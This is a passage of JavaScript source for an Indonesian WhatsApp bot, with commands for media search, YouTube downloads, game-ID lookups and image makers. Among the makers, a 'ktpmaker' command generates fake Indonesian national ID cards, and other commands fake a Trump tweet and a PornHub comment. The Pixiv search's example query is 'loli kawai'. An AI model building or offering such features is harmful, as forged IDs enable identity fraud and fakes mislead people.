										"description": `Beliau merupakan anak ke-12 Nabi Yaqub bin Ishaq. Mukjizat yang dimiliki Nabi Yusuf As adalah mampu menafsirkan mimpi.`,
										"rowId": `${prefix}kisah2 yusuf`
									},
									{
										"title": "Nabi Ayyub AS",
										"description": `Nabi Ayub As bisa dikatakan sebagai satu di antara nabi tersabar yang pernah ada. Kehidupannya penuh kebaikan dan kaya raya.`,
										"rowId": `${prefix}kisah2 ayub`
									},
									{
										"title": "Nabi Dzulkifli AS",
										"description": `Beliau adalah satu di antara utusan Allah yang terkenal dengan kesabaran serta sifat dermawannya.Nabi Zulkifli As adalah anak satu-satunya dari Nabi Ayyub As yang selamat dari reruntuhan rumah.`,
										"rowId": `${prefix}kisah2 Zulkifli`
									},
									{
										"title": "Nabi Syuaib AS",
										"description": `Nabi Syuaib As diutus untuk kaum Madyan, yang ingkar dan menolak ajakan Beliau untuk menyembah kepada Allah SWT.`,
										"rowId": `${prefix}kisah2 suaib`
									},
									{
										"title": "Nabi Yunus AS",
										"description": `Mukjizat Nabi Yunus As yang terkenal adalah tetap selamat ketika ditelan ikan Paus.`,
										"rowId": `${prefix}kisah2 yunus`
									},
									{
										"title": "Nabi Musa AS",
										"description": `Utasan Allah ini merupakan saudara Nabi Harun As, yang dilahirkan di Mesir ketika masa pemerintahan Raja Fir’aun.Kisah mukjizat Nabi Musa yang paling terkenal adalah ketika tongkatnya mampu membelah lautan ketika dikejar oleh Fir’aun`,
										"rowId": `${prefix}kisah2 musa`
									},
									{
										"title": "Nabi Harun AS",
										"description": `Beliau adalah saudara Nabi Musa As yang membantunya berdakwah untuk mengingatkan Fir’aun. Beliau dikaruniai kemampuan berbahasa yang luar biasa.`,
										"rowId": `${prefix}kisah2 harun`
									},
									{
										"title": "Nabi Ilyas AS",
										"description": `Nabi Ilyas As merupakan utusan Allah SWT bagi kaun Bani Israil yang gemar menyembah patung yang diberi nama Ba’al.`,
										"rowId": `${prefix}kisah2 ilyas`
									},
									{
										"title": "Nabi Ilyasa AS",
										"description": `Nabi Ilyas As diutus pada kaum Bani Israil dan Arami, agar mau kembali beriman kepada Allah.`,
										"rowId": `${prefix}kisah2 ilyasa`
									},
									{
										"title": "Nabi Daud AS",
										"description": `Salah satu mukjizat Nabi Daud adalah memilki kitab Zabur. Beliau juga punya kemampuan dapat berkomunikasi dengan burung.`,
										"rowId": `${prefix}kisah2 daud`
									},
									{
										"title": "Nabi Sulaiman AS",
										"description": `Satu di antara mukjizat Nabi Sulaiman As adalah bisa bicara dengan binatang. Ia juga raja yang kaya raya dan dermawan.`,
										"rowId": `${prefix}kisah2 Sulaiman`
									},
									{
										"title": "Nabi Zakariya AS",
										"description": `Nabi Dzakaria As merupakan keturunan dari Nabi Daud As dan juga Nabi Sulaiman As.`,
										"rowId": `${prefix}kisah2 Zakaria`
									},
									{
										"title": "Nabi Yahya AS",
										"description": `Nabi Yahya As adalah anak dari Nabi Zakaria As yang lahir ketika usianya sudah sangat tua.Beliau merupakan seorang manusia yang berprinsip, integritasnya tinggi serta benar-benar menegakkan kebenaran.`,
										"rowId": `${prefix}kisah2 Yahya`
									},
									{
										"title": "Nabi Isa AS",
										"description": `Nabi Isa As terlahir dengan mukjizat Allah SWT pada seorang perempuan suci bernama Maryam. Beliau mendapatkan mukjizat kitab Injil.`,
										"rowId": `${prefix}kisah2 isa`
									},
									{
										"title": "Nabi Muhammad SAW",
										"description": `Nabi Muhammad SAW merupakan nabi terakhir sekaligus penutup. Mukjizat Nabi Muhammad SAW adalah kitab suci Al-Qur'an.\nKitab suci Al-Qur'an sebagai kitab suci yang terakhir sebagai penyempurna kitab-kitab sebelumnya yang diturunkan oleh Allah`,
										"rowId": `${prefix}kisah2 Muhammad`
									}
								]
							}
						],
          listType: 1
                }
            }), {})
            Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break

//[ DOWNLOAD MENU SEARCH MENU]\\ No Apikey
	    case '12345yts': case '12345ytsearch': {
                if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} Story WA Anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = '*YouTube Search*\n\n Hasil Pencarian : '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Author : ${i.author.name}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
                }
                Pajrin.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
         case '12345gugel': case '12345google': {
                if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} Presiden pertama Indonesia`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `⭔ *Title* : ${g.title}\n`
                teks += `⭔ *Description* : ${g.snippet}\n`
                teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                reply(teks)
                })
                }
                break
        case '12345gimage': case '12345googleimage': {
        if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} Soekarno`
        let gis = require('g-i-s')
        gis(text, async (error, result) => {
        n = result
        images = n[Math.floor(Math.random() * n.length)].url
        let buttons = [
                    {buttonId: `${prefix}gimage ${text}`, buttonText: {displayText: '➡️Next Image➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: `*----「 GIMAGE SEARCH 」----*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
                    footer: `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
        })
        }
        break
	    case '12345play': case '12345ytplay': {
                if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} DJ love story`
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                    ngen = `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Uploaded : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
`
message = await prepareWAMessageMedia({ image : { url: anu.thumbnail } }, { upload:   Pajrin.waUploadToServer })
                template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                    templateMessage: {
                        hydratedTemplate: {
                            imageMessage: message.imageMessage,
                            hydratedContentText: ngen,
                            hydratedFooterText: `Memutar untuk ${text}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: '🥬Video Source Link🥬',
                                    url: `${anu.url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '🎵Audio🎵',
                                    id: `#ytmp3 ${anu.url} 320kbps`
                                    }
                                },{quickReplyButton: {
                                    displayText: '🎥VIdeo🎥',
                                    id: `#ytmp4 ${anu.url} 360p`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat, quoted: m })
                  Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
	    case '12345ytmp3': case '12345ytaudio': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `*Masukan Link YouTube*\n_Contoh :_ ${prefix + command} https://youtube.com/shorts/6853iqLNWKA`
                let quality = args[1] ? args[1] : '320kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 999999) return reply('Audio size is too big '+util.format(media))
                Pajrin.sendImage(m.chat, media.thumb, `*〔 YouTube Mp3 〕*

*⭔ Title :* ${media.title}
*⭔ File Size :* ${media.filesizeF}
*⭔ Url :* ${isUrl(text)}
*⭔ Resololution :* ${args[1] || '320kbps'}`, m)
                Pajrin.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case '12345ytmp4': case '12345ytvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `*Masukan Link YouTube*\n_Contoh :_ ${prefix + command} https://youtube.com/shorts/6853iqLNWKA`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 999999) return reply('Video size is too big '+util.format(media))
                Pajrin.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `*〔 YouTube Video 〕*

*⭔ Title :* ${media.title}
*⭔ File Size :* ${media.filesizeF}
*⭔ Url :* ${isUrl(text)}
*⭔ Resololution :* ${args[1] || '360p'}` }, { quoted: m })
            }
            break
	    case '12345getmusic': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `*Reply pesan bot (List Result yt search)* , dengan caption : ${prefix + command} <nomor list>\n\n*_Contoh :_* ${prefix + command} 1`
                if (!m.quoted) return reply('Reply Pesan (List yt search yang dikirim oleh Bot) ')
                if (!m.quoted.isBaileys) throw `Reply Pesan (List Result yt search yang dikirim oleh Bot)`
            let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin yang Anda tulis tidak ada di list result ytsearch`
                let quality = args[1] ? args[1] : '320kbps'
                let media = await yta(urls[text - 1], quality)
                if (media.filesize >= 999999) return reply('Audio size is too big '+util.format(media))
                Pajrin.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolution : ${args[1] || '320kbps'}`, m)
                Pajrin.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case '12345getvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `*Reply pesan bot (List Result yt search)* , dengan caption : ${prefix + command} <nomor list>\n\n*_Contoh :_* ${prefix + command} 3 `
                if (!m.quoted) return reply('Reply Pesan (List yt search yang dikirim oleh Bot) ')
                if (!m.quoted.isBaileys) throw `Reply Pesan (List Result yt search yang dikirim oleh Bot)`
                let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin yang Anda tulis tidak ada di list result ytsearch`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(urls[text - 1], quality)
                if (media.filesize >= 100000) return reply('File Over Limit '+util.format(media))
                Pajrin.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolution : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
            case '12345pinterest': {
            	
                replay(mess.wait)
		let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `${prefix}gimage ${text}`, buttonText: {displayText: '➡️Next Image➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*----「 PINTEREST SEARCH 」----*
🤠 *Query* : ${text}
🔗 *Media Url* : ${result}`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            
	    case '12345couplepp': case '12345ppcouple': {
                replay(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                Pajrin.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                Pajrin.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break
            case '12345coffee': case '12345kopi': {
            let buttons = [
                    {buttonId: `${prefix}coffe`, buttonText: {displayText: '➡️Next Image➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `☕Random Coffee☕`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case '12345wallpaper': {
            	if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} uciha sasuke`
		let { wallpaper } = require('./lib/scraper')
                anu = await wallpaper(text)
                result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `${prefix}wallpaper ${text}`, buttonText: {displayText: '➡️Next Image➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case '12345wikimedia': {
                if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} gunung lawu`
		let { wikimedia } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `${prefix}wikimedia ${text}`, buttonText: {displayText: '➡️Next Image➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
//[SEARCH MENU]\\ With apikey lol human
                    case '12345konachan': case '12345konachansearch': {
                if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} azur_lane`                 
                let buttons = [
                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: api('zenz', '/konachan', { query: text }, 'apikey') },
                    caption: `*〔 Konachan Image Search : ${text} 〕*`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
          break
          case '12345pixiv': case '12345pixivsearch': {
                if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} loli kawai`
                let anu = await fetchJson(api('zenz', '/pixiv2', { query: text }, 'apikey'))
                let asu = anu.result
                let result = asu[Math.floor(Math.random() * asu.length)]
                let buttons = [
                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*〔 Pixiv Image Search : ${text} 〕*`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
          break
          case '12345unsplash': case '12345unsplashsearch': {
                if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} mountain`
                let anu = await fetchJson(api('zenz', '/unsplash', { query: text }, 'apikey'))
                let asu = anu.result
                let result = asu[Math.floor(Math.random() * asu.length)]
                let buttons = [
                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*〔 Unsplash Image Search : ${text} 〕*`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
          break
           case '12345groupwhatsapp': case '12345grupwa':  case '12345groupwa': case '12345gcwa': {
                if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} islami`
                let anu = await fetchJson(api('zenz', '/groupwhatsapp2', { query: text }, 'apikey'))
                let asu = anu.result
                let result = asu[Math.floor(Math.random() * asu.length)]
let buttons = [
                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1},
                ]
                let buttonMessage = {
                    text: `*〔 Group WA Search 〕*
                    
${result.title}
${result.link}`,
                    footer: 'Klik NEXT untuk Hasil Pencarian yang Lainnya',
                    buttons: buttons,
                    headerType: 2
                }
             Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
          }
                break
case '12345katabijak': case '12345katabijaksearch': {
                if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} cinta`
                let anu = await fetchJson(api('zenz', '/searchbijak', { query: text }, 'apikey'))
                let asu = anu.result
                let result = asu[Math.floor(Math.random() * asu.length)]
let buttons = [
                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1},
                    {buttonId: `${prefix}copy ${result.quote}\n\n${result.author}`, buttonText: {displayText: `📄COPY TEKS📄`}, type: 1}
                ]
                let buttonMessage = {
                    text: `${result.quote}
                    
_~${result.author}_`,
                    footer: 'Klik NEXT untuk Hasil Pencarian yang Lainnya',
                    buttons: buttons,
                    headerType: 2
                }
             Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
          }
                break
//[Creator maker]\\ With apikey lol human
              case '12345gsuggest': case '12345googlesuggest': {
                if (!text) throw `*Masukan teks1+teks2+teks3*\n _Contoh:_ ${prefix + command} Fazrin+Fazrin Gamteng+Fazrin Gamteng banget`
                replay(mess.wait)
                siji = arg.split('+')[0]
              loro = arg.split('+')[1]
              telu = arg.split('+')[2]              
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/gsuggest?apikey=${global.apilol}&text1=${siji}&text2=${loro}&text3=${telu}` }, caption: `Google Suggest` }, { quoted: m })
            }
            break
            case '12345ytkomen': case '12345ytcomment': case '12345youtubecomment': {
                if (!text) throw `*Send/Reply Image dengan Caption ${prefix + command} username+comment*\n_Contoh:_ ${prefix + command} xZrinva+Hai rakyat wibu, apa kabarnya?`
	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command} ${text}`
	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
	let anu = await TelegraPh(media)
                replay(mess.wait)
                siji = arg.split('+')[0]
              loro = arg.split('+')[1]              
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ytcomment?apikey=${global.apilol}&username=${siji}&comment=${loro}&img=${anu}` }, caption: `YouTube Comment` }, { quoted: m })
            }
            break
            case '12345amongus': {
            	if (!text) throw `*Masukan teks !*\n _Contoh:_ ${prefix + command} Hai rakyat wibu`
            m.reply(mess.wait)
            Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/amongus?apikey=${global.apilol}&text=${text}` }, caption: `Amongus maker` }, { quoted: m })	
            }
            break
           case '12345idulfitri': {
            	if (!text) throw `*Masukan teks !*\n _Contoh:_ ${prefix + command} xZrinva`
            m.reply(mess.wait)
            Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/idulfitri?apikey=${global.apilol}&text=${text}` }, caption: `Idul Fitri Card Maker` }, { quoted: m })	
            }
            break
            case '12345ramadhan': {
            	if (!text) throw `*Masukan teks !*\n _Contoh:_ ${prefix + command} xZrinva`
            m.reply(mess.wait)
            Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ramadhan?apikey=${global.apilol}&text=${text}` }, caption: `Ramadhan Card Maker` }, { quoted: m })	
            }
            break
            case '12345phkomen': case '12345pornhubcomment': case '12345phcomment': {
                if (!text) throw `*Send/Reply Image dengan Caption ${prefix + command} username+comment*\n_Contoh:_ ${prefix + command} xZrinva+Hai rakyat wibu, apa kabarnya?`
	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command} ${text}`
	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
	let anu = await TelegraPh(media)
                replay(mess.wait)
                siji = arg.split('+')[0]
              loro = arg.split('+')[1]              
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/phcomment?apikey=${global.apilol}&img=${anu}&text=${loro}&username=${siji}` }, caption: `PornHub Comment` }, { quoted: m })
            }
            break
            case '12345twtrump': case '12345tweettrump': {
            	if (!text) throw `*Masukan teks !*\n _Contoh:_ ${prefix + command} Hai rakyat Indonesia yang mayoritas wibu`
        m.reply(mess.wait)
    Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/tweettrump?apikey=${global.apilol}&text=${text}` }, caption: `Tweet Donald Trump` }, { quoted: m })	
            }
            break
case '12345ktp': case '12345ktpmaker': case '12345makerktp': {
                if (!text) throw `*Send/Reply Image dengan Caption ${prefix + command} Nik+Provinsi+Kabupaten+Nama+tempat tanggal lahir+Jenis kelamin+Jalan+Rt/Rw+Desa+Kecamatan+Agama+Status kawin+Pekerjaan+Warga Negara+Berlaku hingga*\n\n_Contoh:_ \n${prefix + command} 3531130509050007+Jawa Barat+Sukabumi+xZrinva+Mars, 30-Februari-2030+Belum Diketahui+JL Jendral Fazrin +02/01+Sukonedo+Jangan Asem+Islam+Jomblo kack+Nuyul+Indonesia asli+Hari Kiamat`
	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command} ${text}`
	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
	let anu = await TelegraPh(media)
                replay(mess.wait)
              nik = arg.split('+')[0]
              prov = arg.split('+')[1]  
              kabu = arg.split('+')[2]  
              name = arg.split('+')[3] 
              ttl = arg.split('+')[4]  
              jk = arg.split('+')[5]  
              jl = arg.split('+')[6] 
              rtrw = arg.split('+')[7]  
              lurah = arg.split('+')[8]
              camat = arg.split('+')[9] 
              agama = arg.split('+')[10]
              nikah = arg.split('+')[11]
              kerja = arg.split('+')[12] 
              warga = arg.split('+')[13]      
              berlaku = arg.split('+')[14]      
   
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ktpmaker?apikey=${global.apilol}&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${berlaku}&img=${anu}` }, caption: `KTP Maker` }, { quoted: m })
            }
            break
case '12345yugioh': case '12345ygo': case '12345yougioh': {
                if (!text) throw `*Send/Reply Image dengan Caption ${prefix + command} Title+Deskripsi+atk+def*\n\n_Contoh:_\n${prefix + command} xZrinva+Owner Paling Gans, Makasih+999+1955`
	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command} ${text}`
	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
	let anu = await TelegraPh(media)
                replay(mess.wait)
                title1 = arg.split('+')[0]
              desc1 = arg.split('+')[1]              
              atk = arg.split('+')[2]
              def = arg.split('+')[3]        
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/yugioh?apikey=${global.apilol}&img=${anu}&title=${title1}&desc=${desc1}&atk=${atk}&def=${def}` }, caption: `PornHub Comment` }, { quoted: m })
            }
            break
//[quotes MAKER MENU]\\ With apikey lol human
           case '12345quotesmaker': case '12345qmaker': {
            	if (!text) throw `*Masukan teks/quotes!*\n\n  _Contoh:_\n${prefix + command} Sukses bukanlah kunci kebahagiaan. Kebahagiaan adalah kunci kesuksesan. Jika Anda mencintai pekerjaan Anda, Anda akan menjadi orang yang sukses`
            m.reply(mess.wait)
            Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/quotemaker?apikey=${global.apilol}&text=${text}` }, caption: `Quotes Maker` }, { quoted: m })	
            }
            break
            case '12345quotesmaker2': case '12345qmaker2': {
            	if (!text) throw `*Masukan author+quotes!*\n\n  _Contoh:_\n${prefix + command} Fazrin Mauza+Sukses bukanlah kunci kebahagiaan. Kebahagiaan adalah kunci kesuksesan. Jika Anda mencintai pekerjaan Anda, Anda akan menjadi orang yang sukses`
            m.reply(mess.wait)
      author1 = arg.split('+')[0]
              quotesnya = arg.split('+')[1]              
      Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/quotemaker2?apikey=${global.apilol}&text=${quotesnya}&author=${author1}` }, caption: `Quotes Maker2` }, { quoted: m })	
            }
            break
case '12345qmaker3': case '12345quotesmaker2': case '12345quotemakr3': {
                if (!text) throw `*Send/Reply Image dengan Caption ${prefix + command} teks/quotes*\n\n_Contoh:_\n${prefix + command} Sukses bukanlah kunci kebahagiaan. Kebahagiaan adalah kunci kesuksesan. Jika Anda mencintai pekerjaan Anda, Anda akan menjadi orang yang sukses`
	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command} ${text}`
	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
	let anu = await TelegraPh(media)
                replay(mess.wait)
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/quotemaker3?apikey=${global.apilol}&text=${text}.&img=${anu}` }, caption: `Quotes Maker 3` }, { quoted: m })
            }
            break

//[Game id check  game id cek MENU]\\ With apikey lol human
            case '12345cekff': case '12345ffcek': {
            	if (!text) throw `*Masukan PlayerID Free Fire !*\n _Contoh:_ ${prefix + command} 570098876`
           m.reply(mess.wait)
 let anu = await fetchJson(`https://api.lolhuman.xyz/api/freefire/${text}?apikey=${global.apilol}`)
replay(`*〔 Free Fire Checker 〕*

*⭔ PlayerID :* ${text}
*⭔ Username :* ${anu.result}`)
}
break
case '12345cekmlbb': case '12345mlbbcek': {
            	if (!text) throw `*Masukan PlayerID server Mobile Legend !*\n _Contoh:_ \n${prefix + command} 84830127 2169`
            idplayer = args[0]
                serverid = args[1]
m.reply(mess.wait)
let anu = await fetchJson(`https://api.lolhuman.xyz/api/mobilelegend/${idplayer}/${serverid}?apikey=${global.apilol}`)
replay(`*〔 Mobile Legend Checker 〕*

*⭔ PlayerID :* ${idplayer}
*⭔ ServerID :* ${serverid}
*⭔ Username :* ${anu.result}`)
}
break
case '12345cekpubg': case '12345pubgcek': {
            	if (!text) throw `*Masukan PlayerID PUBG !*\n _Contoh:_\n${prefix + command} 5119961143`
           m.reply(mess.wait)
 let anu = await fetchJson(`https://api.lolhuman.xyz/api/pubg/${text}?apikey=${global.apilol}`)
replay(`*〔 PUBG Checker 〕*

*⭔ PlayerID :* ${text}
*⭔ Username :* ${anu.result}`)
}
break
case '12345cekdomino': case '12345dominocek': {
            	if (!text) throw `*Masukan UserID Highh Domino !*\n _Contoh:_\n${prefix + command} 291756557`
           m.reply(mess.wait)
 let anu = await fetchJson(`https://api.lolhuman.xyz/api/higghdomino/${text}?apikey=${global.apilol}`)
replay(`*〔 Highh Domino Checker 〕*

*⭔ UserID :* ${text}
*⭔ Username :* ${anu.result}`)
}
break

//[Teks MAKER MENU]\\ With apikey lol human
//nulis
case '12345nulis': {
                if (!text) throw `*Masukan Teks !*\n _Contoh:_ \n${prefix + command} Nama : Fazrin Mauza 
Nomor absen : 11
Kelas : X IPA 5
Mapel : Biologi

 alat reproduksi manusia ada dua jenis yaitu laki-laki dan perempuan,keduanya memiliki ciri fisik dan fungsi yang berbeda
 Sistem reproduksi pada manusia termasuk ke dalam kategori reproduksi seksual. Artinya, reproduksi terjadi melalui proses bertemunya gamet jantan (sperma) dengan gamet betina (ovum) membentuk individu baru yang disebut dengan fertilisasi
 Hasil dari fertilisasi atau pembuahan adalah terbentuknya zigot. Zigot kemudian mengalami perkembangan embrio hingga dilahirkan menjadi anak. Sebagian mamalia, termasuk manusia, bereproduksi secara seksual. Laki-laki akan menghasilkan sperma, sementara perempuan akan menghasilkan ovum.`
                replay(mess.wait)
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/nulis?apikey=${global.apilol}&text=${text}` }, caption: `mager nulis ya` }, { quoted: m })
            }
            break

//1 TEXT PRO ME
       case '12345blackpink': case '12345neon': case '12345greenneon': case '12345futureneon': case '12345sandwriting': case '12345sandsummer': case '12345sandengraved': case '12345text1917': case '12345holographic': case '12345neonlight': case '12345metaldark': case '12345halloween': case '12345bloodfrosted': case '12345newyearcard': case '12345deluxesilver': case '12345minion': case '12345toxic': case '12345bokeh': case '12345natureleaves': case '12345fireworksparkle': case '12345jokerlogo': case '12345icecold': case '12345breakwall': case '12345roadwarning':  case '12345box3d': case '12345strawberry': case '12345thunder': case '12345horrorblood': case '12345summersand': case '12345cloud': case '12345luxury': case '12345watercolor': case '12345foggywindow': case '12345harrypotter': case '12345impressiveglitch': case '12345magma': case '12345wonderfulgraffiti': {
                if (!text) throw `*Masukan teks!*\n _Contoh:_ ${prefix + command} Fazrin Gamteng`
                replay(mess.wait)
                Pajrin.sendMessage(m.chat, { image: { url: api('zenz', '/textprome/' + command, { text: text }, 'apikey') }, caption: `Text pro ${command}` }, { quoted: m })
            }
          break
//2 TEXT PRO ME
